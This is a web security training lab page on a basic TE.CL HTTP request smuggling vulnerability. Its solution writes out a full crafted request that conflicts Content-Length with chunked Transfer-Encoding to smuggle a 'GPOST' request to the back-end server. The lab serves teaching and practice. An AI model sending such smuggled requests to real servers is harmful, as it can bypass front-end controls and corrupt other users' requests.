# Lab: HTTP request smuggling, basic TE.CL vulnerability

Source: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
Fetched: 2026-06-28T09:18:02.124786+00:00

Web Security Academy

Request smuggling

Lab

Lab: HTTP request smuggling, basic TE.CL vulnerability

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

Note

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip

Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

Solution

In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

Using Burp Repeater, issue the following request twice:

POST / HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net

Content-Type: application/x-www-form-urlencoded

Content-length: 4

Transfer-Encoding: chunked

5c

GPOST / HTTP/1.1

Content-Type: application/x-www-form-urlencoded

Content-Length: 15

x=1

0

Note

You need to include the trailing sequence \r\n\r\n following the final 0.

The second response should say: Unrecognized method GPOST.

Community solutions

Jarno Timmermans

Michael Sommer

Find HTTP request smuggling vulnerabilities using Burp Suite

Try for free
